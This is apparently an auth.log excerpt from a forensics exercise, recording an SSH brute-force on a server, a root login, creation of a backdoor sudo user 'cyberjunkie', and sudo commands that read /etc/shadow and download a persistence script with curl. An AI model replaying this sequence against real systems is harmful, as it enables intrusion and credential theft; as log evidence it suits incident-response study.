+Mar  6 06:31:37 ip-172-31-35-28 sshd[2363]: Disconnected from invalid user server_adm 65.2.161.68 port 46620 [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2367]: Received disconnect from 65.2.161.68 port 46664:11: Bye Bye [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2367]: Disconnected from invalid user server_adm 65.2.161.68 port 46664 [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2393]: Invalid user svc_account from 65.2.161.68 port 46774
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2393]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2393]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2377]: Failed password for invalid user server_adm from 65.2.161.68 port 46684 ssh2
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2394]: Invalid user svc_account from 65.2.161.68 port 46786
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2394]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2394]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2397]: Invalid user svc_account from 65.2.161.68 port 46814
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2398]: Invalid user svc_account from 65.2.161.68 port 46840
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2397]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2397]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2396]: Invalid user svc_account from 65.2.161.68 port 46800
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2398]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2398]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2400]: Invalid user svc_account from 65.2.161.68 port 46854
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2396]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2396]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2400]: pam_unix(sshd:auth): check pass; user unknown
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2400]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2377]: Received disconnect from 65.2.161.68 port 46684:11: Bye Bye [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2377]: Disconnected from invalid user server_adm 65.2.161.68 port 46684 [preauth]
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2399]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=root
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2407]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=root
+Mar  6 06:31:37 ip-172-31-35-28 sshd[2409]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=root
+Mar  6 06:31:38 ip-172-31-35-28 sshd[2379]: Failed password for invalid user server_adm from 65.2.161.68 port 46698 ssh2
+Mar  6 06:31:38 ip-172-31-35-28 sshd[2380]: Failed password for invalid user server_adm from 65.2.161.68 port 46710 ssh2
+Mar  6 06:31:38 ip-172-31-35-28 sshd[2383]: Failed password for invalid user svc_account from 65.2.161.68 port 46722 ssh2
+Mar  6 06:31:38 ip-172-31-35-28 sshd[2384]: Failed password for invalid user svc_account from 65.2.161.68 port 46732 ssh2
+Mar  6 06:31:38 ip-172-31-35-28 sshd[2387]: Failed password for invalid user svc_account from 65.2.161.68 port 46742 ssh2
+Mar  6 06:31:38 ip-172-31-35-28 sshd[2389]: Failed password for invalid user svc_account from 65.2.161.68 port 46744 ssh2
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2391]: Failed password for invalid user svc_account from 65.2.161.68 port 46750 ssh2
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2393]: Failed password for invalid user svc_account from 65.2.161.68 port 46774 ssh2
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2394]: Failed password for invalid user svc_account from 65.2.161.68 port 46786 ssh2
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2397]: Failed password for invalid user svc_account from 65.2.161.68 port 46814 ssh2
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2398]: Failed password for invalid user svc_account from 65.2.161.68 port 46840 ssh2
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2396]: Failed password for invalid user svc_account from 65.2.161.68 port 46800 ssh2
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2400]: Failed password for invalid user svc_account from 65.2.161.68 port 46854 ssh2
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2399]: Failed password for root from 65.2.161.68 port 46852 ssh2
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2407]: Failed password for root from 65.2.161.68 port 46876 ssh2
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2383]: Received disconnect from 65.2.161.68 port 46722:11: Bye Bye [preauth]
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2383]: Disconnected from invalid user svc_account 65.2.161.68 port 46722 [preauth]
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2384]: Received disconnect from 65.2.161.68 port 46732:11: Bye Bye [preauth]
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2384]: Disconnected from invalid user svc_account 65.2.161.68 port 46732 [preauth]
+Mar  6 06:31:39 ip-172-31-35-28 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Received disconnect from 65.2.161.68 port 46698:11: Bye Bye [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Disconnected from invalid user server_adm 65.2.161.68 port 46698 [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2380]: Received disconnect from 65.2.161.68 port 46710:11: Bye Bye [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2380]: Disconnected from invalid user server_adm 65.2.161.68 port 46710 [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2387]: Connection closed by invalid user svc_account 65.2.161.68 port 46742 [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2423]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2424]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2389]: Connection closed by invalid user svc_account 65.2.161.68 port 46744 [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2391]: Connection closed by invalid user svc_account 65.2.161.68 port 46750 [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Received disconnect from 65.2.161.68 port 34782:11: Bye Bye
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Disconnected from user root 65.2.161.68 port 34782
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session closed for user root
+Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Session 34 logged out. Waiting for processes to exit.
+Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2393]: Connection closed by invalid user svc_account 65.2.161.68 port 46774 [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2394]: Connection closed by invalid user svc_account 65.2.161.68 port 46786 [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2397]: Connection closed by invalid user svc_account 65.2.161.68 port 46814 [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2398]: Connection closed by invalid user svc_account 65.2.161.68 port 46840 [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2396]: Connection closed by invalid user svc_account 65.2.161.68 port 46800 [preauth]
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2400]: Connection closed by invalid user svc_account 65.2.161.68 port 46854 [preauth]
+Mar  6 06:31:41 ip-172-31-35-28 sshd[2399]: Failed password for root from 65.2.161.68 port 46852 ssh2
+Mar  6 06:31:41 ip-172-31-35-28 sshd[2407]: Failed password for root from 65.2.161.68 port 46876 ssh2
+Mar  6 06:31:41 ip-172-31-35-28 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2
+Mar  6 06:31:41 ip-172-31-35-28 sshd[2399]: Connection closed by authenticating user root 65.2.161.68 port 46852 [preauth]
+Mar  6 06:31:41 ip-172-31-35-28 sshd[2399]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=root
+Mar  6 06:31:41 ip-172-31-35-28 sshd[2407]: Connection closed by authenticating user root 65.2.161.68 port 46876 [preauth]
+Mar  6 06:31:41 ip-172-31-35-28 sshd[2407]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=root
+Mar  6 06:31:42 ip-172-31-35-28 sshd[2409]: Connection closed by authenticating user root 65.2.161.68 port 46890 [preauth]
+Mar  6 06:31:42 ip-172-31-35-28 sshd[2409]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=root
+Mar  6 06:31:42 ip-172-31-35-28 sshd[2423]: Failed password for backup from 65.2.161.68 port 34834 ssh2
+Mar  6 06:31:42 ip-172-31-35-28 sshd[2424]: Failed password for backup from 65.2.161.68 port 34856 ssh2
+Mar  6 06:31:44 ip-172-31-35-28 sshd[2423]: Connection closed by authenticating user backup 65.2.161.68 port 34834 [preauth]
+Mar  6 06:31:44 ip-172-31-35-28 sshd[2424]: Connection closed by authenticating user backup 65.2.161.68 port 34856 [preauth]
+Mar  6 06:32:01 ip-172-31-35-28 CRON[2477]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:32:01 ip-172-31-35-28 CRON[2476]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:32:01 ip-172-31-35-28 CRON[2476]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:32:01 ip-172-31-35-28 CRON[2477]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:32:39 ip-172-31-35-28 sshd[620]: exited MaxStartups throttling after 00:01:08, 21 connections dropped
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
+Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:33:01 ip-172-31-35-28 CRON[2561]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:33:01 ip-172-31-35-28 CRON[2562]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:34:01 ip-172-31-35-28 CRON[2574]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:34:01 ip-172-31-35-28 CRON[2575]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:34:01 ip-172-31-35-28 CRON[2575]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:34:01 ip-172-31-35-28 CRON[2574]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
+Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
+Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
+Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
+Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
+Mar  6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:35:01 ip-172-31-35-28 CRON[2616]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:35:01 ip-172-31-35-28 CRON[2615]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session closed for user root
+Mar  6 06:35:01 ip-172-31-35-28 CRON[2616]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:35:01 ip-172-31-35-28 CRON[2615]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
+Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
+Mar  6 06:36:01 ip-172-31-35-28 CRON[2640]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:36:01 ip-172-31-35-28 CRON[2641]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:36:01 ip-172-31-35-28 CRON[2641]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:36:01 ip-172-31-35-28 CRON[2640]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:37:01 ip-172-31-35-28 CRON[2654]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:37:01 ip-172-31-35-28 CRON[2653]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:37:01 ip-172-31-35-28 CRON[2654]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:37:01 ip-172-31-35-28 CRON[2653]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
+Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
+Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
+Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
+Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
+Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
+Mar  6 06:37:34 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
+Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
+Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
+Mar  6 06:38:01 ip-172-31-35-28 CRON[2751]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:38:01 ip-172-31-35-28 CRON[2750]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:38:01 ip-172-31-35-28 CRON[2750]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:38:01 ip-172-31-35-28 CRON[2751]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:39:01 ip-172-31-35-28 CRON[2765]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:39:01 ip-172-31-35-28 CRON[2764]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:39:01 ip-172-31-35-28 CRON[2765]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:39:01 ip-172-31-35-28 CRON[2764]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
+Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
+Mar  6 06:40:01 ip-172-31-35-28 CRON[2783]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:40:01 ip-172-31-35-28 CRON[2784]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:40:01 ip-172-31-35-28 CRON[2783]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:40:01 ip-172-31-35-28 CRON[2784]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:41:01 ip-172-31-35-28 CRON[2796]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:41:01 ip-172-31-35-28 CRON[2797]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:41:01 ip-172-31-35-28 CRON[2797]: pam_unix(cron:session): session closed for user confluence
+Mar  6 06:41:01 ip-172-31-35-28 CRON[2796]: pam_unix(cron:session): session closed for user confluence
